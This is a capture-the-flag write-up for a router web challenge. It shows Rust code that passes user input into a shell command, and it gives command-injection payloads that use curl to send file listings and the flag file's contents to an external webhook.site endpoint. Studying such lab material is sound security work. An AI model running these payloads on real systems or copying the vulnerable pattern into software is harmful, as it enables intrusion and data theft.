---
created: 2024-06-15T04:41
updated: 2024-08-04T19:46
solves: 63
points: 471
---

> We are developing a new router but not sure if the interface has bug or not. Could you have a look?

Simple source digging gives us the username and password.

```
Username: admin
Password: 123456 (md5=e10adc3949ba59abbe56e057f20f883e)
```

```rust
fn save_properties_to_file(){
    unsafe{
        let cmd = format!("echo \"{ESSID}\\n{BAND}\\n{CHANNEL}\\n{WIFI_PASSWORD}\" > /tmp/{ID}.conf");
        Command::new("/bin/sh")
                        .arg("-c")
                        .arg(cmd)
                        .output()
                        .expect("Failed to execute command");
    }
}
```

It is simple formatting. *face palms*

Changing passwords has no verification.

Payload will be `"; CMD; echo "`, probably not the shortest but it will do the trick.

I will also send all results via curl to webhook.site.

```
"; curl -X POST -d "$(ls -la)" https://webhook.site; echo "
```

`ls` didn't find anything, maybe its some flag.txt thing.

```
"; curl -X POST -d "$(find / -type f -name "*flag*")" https://webhook.site; echo "
```

And there it is.

```
/proc/sys/kernel/acpi_video_flags
/proc/sys/net/ipv4/fib_notify_on_flag_change
/proc/sys/net/ipv6/fib_notify_on_flag_change
/proc/kpageflags
/home/user/flag.txt
/usr/lib/x86_64-linux-gnu/perl/5.34.0/bits/waitflags.ph
/usr/lib/x86_64-linux-gnu/perl/5.34.0/bits/ss_flags.ph
/sys/devices/pnp0/00:05/tty/ttyS2/flags
/sys/devices/pnp0/00:03/tty/ttyS0/flags
/sys/devices/pnp0/00:06/tty/ttyS3/flags
/sys/devices/pnp0/00:04/tty/ttyS1/flags
/sys/devices/virtual/net/lo/flags
/sys/devices/virtual/net/eth0/flags
/sys/module/scsi_mod/parameters/default_dev_flags
```

One last step from `/home/user/flag.txt`

```
"; curl -X POST -d "$(cat /home/user/flag.txt)" https://webhook.site; echo "
```

```flag
vsctf{1s_1t_tru3_wh3n_rust_h4s_c0mm4nd_1nj3ct10n!??}
```
